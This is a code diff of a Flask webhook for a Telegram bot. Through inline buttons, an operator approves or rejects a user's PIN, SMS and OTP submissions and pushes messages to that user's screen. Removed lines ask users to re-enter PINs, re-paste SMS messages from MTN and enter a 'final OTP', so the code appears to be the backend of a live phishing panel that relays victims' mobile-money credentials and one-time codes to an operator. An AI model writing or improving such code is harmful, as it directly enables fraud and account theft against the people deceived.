@@ -136,9 +136,7 @@ def submit_support():
 def telegram_webhook():
     try:
         data = request.get_json() or {}
-        print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
         
-        # 1. Handle Inline Button Clicks (Approvals, Rejections, Flags, Resolve)
         if "callback_query" in data:
             callback = data["callback_query"]
             callback_data = callback.get("data", "")
@@ -147,6 +145,7 @@ def telegram_webhook():
             chat_id = message_obj.get("chat", {}).get("id")
             message_id = message_obj.get("message_id")
             original_text = message_obj.get("text", "")
+            reply_markup = message_obj.get("reply_markup")
             
             parts = callback_data.split("_")
             if len(parts) >= 3:
@@ -154,28 +153,18 @@ def telegram_webhook():
                 step_code = parts[1]
                 db_id = parts[2]
                 
-                text_response = "Action processed"
-                status_banner = ""
+                step_name = step_code.upper()
                 
                 try:
                     obj_id = ObjectId(db_id)
-                except Exception as e:
-                    print(f"❌ Invalid ObjectId format: {db_id}, error: {e}")
+                except Exception:
                     return jsonify({"status": "ok"}), 200
 
                 target_app = applications_collection.find_one({"_id": obj_id})
                 if not target_app:
                     target_app = applications_collection.find_one(sort=[("_id", -1)])
 
-                if action == "resolve":
-                    if step_code == "help":
-                        support_collection.update_one(
-                            {"_id": obj_id},
-                            {"$set": {"status": "Resolved"}}
-                        )
-                        text_response = "✅ Ticket marked as Resolved!"
-                        status_banner = "✅ Support Ticket Resolved!\n\n"
-                elif target_app:
+                if target_app:
                     actual_obj_id = target_app["_id"]
                     
                     if action == "approve":
@@ -192,154 +181,68 @@ def telegram_webhook():
                             {"_id": actual_obj_id},
                             {"$set": {"status": new_status, "custom_message": ""}}
                         )
-                        text_response = f"✅ {step_code.upper()} Approved! User has moved to the next step."
-                        status_banner = f"✅ {step_code.upper()} Approved! User has moved to the next step.\n\n"
+                        status_banner = f"✅ {step_name} Approved! User has moved to the next step.\n\n"
+                        text_response = f"✅ {step_name} Approved!"
 
                     elif action == "reject":
-                        if step_code == "pin":
-                            new_status = "Reject_PIN"
-                            fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
-                        elif step_code == "sms":
-                            new_status = "Reject_SMS"
-                            fail_msg = "❌ SMS message was invalid or expired. Please re-copy and paste."
-                        elif step_code == "otp":
-                            new_status = "Reject_OTP"
-                            fail_msg = "❌ Final OTP incorrect. Please check your messages and try again."
-                        else:
-                            new_status = "Rejected"
-                            fail_msg = "❌ Request rejected. Please try again."
-
                         applications_collection.update_one(
                             {"_id": actual_obj_id},
-                            {"$set": {"status": new_status, "custom_message": fail_msg}}
+                            {"$set": {"status": "Rejected", "custom_message": f"Invalid {step_name} details. Please try again."}}
                         )
-                        text_response = f"❌ {step_code.upper()} Rejected!"
-                        status_banner = f"❌ {step_code.upper()} Rejected!\n\n"
-
-                    elif action == "badsms":
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid SMS/data format submitted. Please copy the complete, unedited message from MTN."}}
-                        )
-                        text_response = "⚠️ Flagged bad input!"
-                        status_banner = "⚠️ Flagged Bad SMS/Data Input!\n\n"
-
-                    elif action == "stalled":
-                        applications_collection.update_one(
-                            {"_id": actual_obj_id},
-                            {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Your session is waiting for authorization. Please respond promptly."}}
-                        )
-                        text_response = "⏱️ Sent stall reminder!"
-                        status_banner = "⏱️ Stalled User Reminder Sent!\n\n"
-
+                        status_banner = f"❌ {step_name} Rejected!\n\n"
+                        text_response = f"❌ {step_name} Rejected!"
+                    
                     elif action == "msg":
                         applications_collection.update_one(
                             {"_id": actual_obj_id},
-                            {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please review your entry and provide the correct information."}}
+                            {"$set": {"status": "CustomMessage", "custom_message": "Action Required: Please re-enter your details."}}
                         )
-                        text_response = "💬 Prompt sent!"
-                        status_banner = "💬 Custom Message Prompt Sent!\n\n"
+                        status_banner = "💬 Action Required Prompt Sent!\n\n"
+                        text_response = "💬 Prompt sent to user!"
+                    
+                    else:
+                        status_banner = "⚠️ Action Processed\n\n"
+                        text_response = "Action processed."
 
-                # Edit message in-place to update the top banner
-                if chat_id and message_id:
-                    edit_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
-                    clean_original = original_text
-                    for prefix in ["✅", "❌", "⚠️", "⏱️", "💬"]:
-                        if prefix in clean_original[:5]:
-                            parts_text = clean_original.split("\n\n", 1)
-                            if len(parts_text) > 1:
-                                clean_original = parts_text[1]
+                    # 1. Edit the message text at the top
+                    if chat_id and message_id:
+                        edit_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+                        
+                        # Strip any existing status banner to prevent stacking headers
+                        clean_original = original_text
+                        for prefix in ["✅", "❌", "⚠️", "⏱️", "💬"]:
+                            if prefix in clean_original[:5]:
+                                split_parts = clean_original.split("\n\n", 1)
+                                if len(split_parts) > 1:
+                                    clean_original = split_parts[1]
 
-                    updated_message_text = status_banner + clean_original
+                        updated_text = status_banner + clean_original
+
+                        try:
+                            requests.post(edit_url, json={
+                                "chat_id": chat_id,
+                                "message_id": message_id,
+                                "text": updated_text,
+                                "parse_mode": "Markdown",
+                                "reply_markup": reply_markup  # Keeps your buttons intact
+                            }, timeout=5)
+                        except Exception as edit_err:
+                            print(f"Edit message error: {edit_err}")
+
+                    # 2. Trigger the modal popup notification
+                    answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                     try:
-                        requests.post(edit_url, json={
-                            "chat_id": chat_id,
-                            "message_id": message_id,
-                            "text": updated_message_text,
-                            "parse_mode": "Markdown",
-                            "reply_markup": message_obj.get("reply_markup")
+                        requests.post(answer_url, json={
+                            "callback_query_id": callback_id, 
+                            "text": text_response,
+                            "show_alert": True  # Forces the visible popup box
                         }, timeout=5)
-                    except Exception as edit_err:
-                        print(f"Edit message text error: {edit_err}")
-
-                # Trigger modal popup alert on Telegram screen
-                answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-                try:
-                    requests.post(answer_url, json={
-                        "callback_query_id": callback_id, 
-                        "text": text_response,
-                        "show_alert": True
-                    }, timeout=5)
-                except Exception as e:
-                    print(f"Answer callback error: {e}")
-
-        # 2. Handle Direct Text Messages & Diagnostic Commands (/test or /diagnose)
-        elif "message" in data:
-            msg = data["message"]
-            chat_id = str(msg.get("chat", {}).get("id"))
-            text = msg.get("text", "").strip()
-            
-            if chat_id == TELEGRAM_ADMIN_CHAT_ID:
-                if text == "/test" or text == "/diagnose":
-                    diag_results = []
-                    diag_status_icon = "🟢"
-                    
-                    try:
-                        client.admin.command('ping')
-                        diag_results.append("✅ MongoDB Atlas: Connected & Responsive")
-                    except Exception as db_err:
-                        diag_status_icon = "🔴"
-                        diag_results.append(f"❌ MongoDB Atlas Error: {db_err}")
-                        
-                    try:
-                        wh_res = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo", timeout=5).json()
-                        wh_result_data = wh_res.get("result", {})
-                        pending = wh_result_data.get("pending_update_count", 0)
-                        last_err = wh_result_data.get("last_error_message", "None")
-                        diag_results.append(f"✅ Telegram Webhook Active\n    • Pending Updates: `{pending}`\n    • Last Error: `{last_err}`")
-                    except Exception as wh_err:
-                        diag_status_icon = "🔴"
-                        diag_results.append(f"❌ Webhook Info Check Failed: {wh_err}")
-                        
-                    try:
-                        latest_app = applications_collection.find_one(sort=[("_id", -1)])
-                        if latest_app:
-                            diag_results.append(f"✅ Latest DB Record:\n    • ID: `{latest_app.get('app_id')}`\n    • Status: `{latest_app.get('status')}`")
-                        else:
-                            diag_results.append("⚠️ MongoDB connected, but no applications found yet.")
-                    except Exception as app_err:
-                        diag_status_icon = "🟡"
-                        diag_results.append(f"⚠️ Latest Record Warning: {app_err}")
-                        
-                    report_message = (
-                        f"{diag_status_icon} *SYSTEM DIAGNOSTIC REPORT* {diag_status_icon}\n\n" +
-                        "\n\n".join(diag_results)
-                    )
-                    
-                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                    requests.post(reply_url, json={
-                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-                        "text": report_message,
-                        "parse_mode": "Markdown"
-                    })
-                    return jsonify({"status": "ok"}), 200
-
-                else:
-                    latest_app = applications_collection.find_one(sort=[("_id", -1)])
-                    if latest_app:
-                        applications_collection.update_one(
-                            {"_id": latest_app["_id"]},
-                            {"$set": {"custom_message": text, "status": "CustomMessage"}}
-                        )
-                        reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                        requests.post(reply_url, json={
-                            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-                            "text": f"📢 Pushed live to user screen:\n\"{text}\""
-                        })
+                    except Exception as ans_err:
+                        print(f"Answer callback error: {ans_err}")
 
         return jsonify({"status": "ok"}), 200
     except Exception as global_err:
-        print(f"❌ Webhook global error caught: {global_err}")
+        print(f"❌ Webhook global error: {global_err}")
         return jsonify({"status": "ok"}), 200
 
 
